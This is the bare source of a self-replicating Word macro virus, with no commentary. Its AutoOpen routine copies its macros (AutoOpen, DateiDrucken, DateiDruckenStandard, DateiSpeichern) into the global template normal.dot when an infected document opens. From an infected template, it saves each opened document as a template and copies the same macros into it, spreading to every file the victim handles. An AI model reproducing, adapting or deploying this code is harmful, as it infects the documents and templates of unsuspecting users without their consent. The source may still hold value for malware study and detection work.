   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Q$
   Dim Z$
    If WordBasic.CountMacros(1) <> 0 Then
    Q$ = WordBasic.[FileName$]():
    Z$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDruckenStandard", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiSpeichern", Tab:=3
    Else
    WordBasic.FileSaveAs Format:=1:
    If WordBasic.CountMacros(1) = 0 Then
    Z$ = WordBasic.[FileName$]():
    Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="AutoOpen", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDrucken", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiDruckenStandard", Tab:=3:
    WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
                 Name:="DateiSpeichern", Tab:=3
    End If
    End If
    WordBasic.FileSaveAll 1, 1
   End Sub
